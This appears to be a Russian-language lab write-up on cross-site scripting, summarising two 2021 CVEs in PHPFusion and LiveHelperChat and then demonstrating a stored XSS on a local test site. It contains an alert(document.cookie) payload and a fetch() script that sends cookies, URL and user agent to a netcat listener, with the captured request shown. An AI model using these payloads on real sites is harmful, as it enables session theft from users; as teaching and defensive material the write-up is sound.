@@ -1,0 +1,67 @@
+<h1 id="-1">Часть 1</h1>
+<h3 id="1-cve-2021-28280">1) CVE-2021-28280</h3>
+<p>В CMS PHPFusion 9.03.110, написанной на php, была найдена уязвимость CSRF + XSS, которая позволяет злоумышленникам выполнять произвольные веб-скрипты.</p>
+<p>1) Атакующий создаёт вредоносную HTML-страницу с формой</p>
+<p>2) В неё вставляется payload:</p>
+<pre><code>'&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre><p>3) Жертва открывает страницу </p>
+<p>4) Браузер автоматически отправляет POST-запрос в:</p>
+<pre><code>/<span class="hljs-built_in">search</span>.php
+</code></pre><p>5) Сервер:</p>
+<ul>
+<li>принимает параметр без фильтрации</li>
+<li>возвращает его в ответе</li>
+</ul>
+<p>6) В браузере выполняется JavaScript
+7) Злоумышленник получает куки пользователя</p>
+<p>Источник: <a href="https://anotepad.com/notes/2skndayt">https://anotepad.com/notes/2skndayt</a></p>
+<h3 id="2-cve-2021-4050">2) CVE-2021-4050</h3>
+<p>В LiveHelperChat, php-приложение для тех поддержки пользователей, была найдена уязвимость Stored XSS, позволяющая выполнять произвольный JS код.</p>
+<p>1) Злоумышленник загружает файл формата <strong>.</strong>svg</p>
+<p>2) Внутри SVG внедряется JavaScript-код</p>
+<p>3) При открытии файла браузер рендерит SVG и выполняет скрипт</p>
+<p>Источник: <a href="https://huntr.com/bounties/27eb39d7-7636-4c4b-922c-a2f8fbe1ba05">https://huntr.com/bounties/27eb39d7-7636-4c4b-922c-a2f8fbe1ba05</a></p>
+<p>Сайт <a href="https://cvedb.github.io">CVEDB</a> сообщает о 20 149 CVE за 2021 год. <a href="https://www.stack.watch/stats/2021/">Stackwatch</a> приводит цифру в 21 115.</p>
+<h1 id="-2">Часть 2</h1>
+<p>Попробуем базовый скрипт \<script>alert(1)\</script>
+Работает - получаем уведомление &quot;1&quot;, но это просто выводит уведомление.
+Покажем, что XSS атака может принести настоящий вред:</p>
+<p>Откроем порт на localhost:
+$ nc -l -p 6767
+Это будет симулировать компьютер злоумышленника</p>
+<p>И используем скрипт, который отправит злоумышленнику наши данные</p>
+<p>\<script>
+  fetch(&#39;<a href="http://localhost:6767">http://localhost:6767</a>&#39;, {
+    method: &#39;POST&#39;,
+    body: JSON.stringify({
+      cookie: document.cookie,
+      url: window.location.href,
+      userAgent: navigator.userAgent
+    })
+  });
+\</script></p>
+<p>На открытом порту получаем данные:
+$ nc -l -p 6767
+POST / HTTP/1.1
+Host: localhost:6767
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0
+Accept: <em>/</em>
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: <a href="http://localhost:8080/">http://localhost:8080/</a>
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 152
+Origin: <a href="http://localhost:8080">http://localhost:8080</a>
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Priority: u=4</p>
+<p>{&quot;cookie&quot;:&quot;&quot;,
+&quot;url&quot;:&quot;<a href="http://localhost:8080/XSS-1/index.php">http://localhost:8080/XSS-1/index.php</a>&quot;,
+&quot;userAgent&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0&quot;}</p>
+<p>Итого: уязвимость stored XSS (потому что комментарий сохраняется и скрипт срабатывает каждый раз когда заходишь в комментарии). Меры по защите:</p>
+<ul>
+<li>запретить следующие символы: &lt; &gt; &quot; &#39; &amp; / `</li>
+<li>использовать экранирование через url encoding</li>
+</ul>
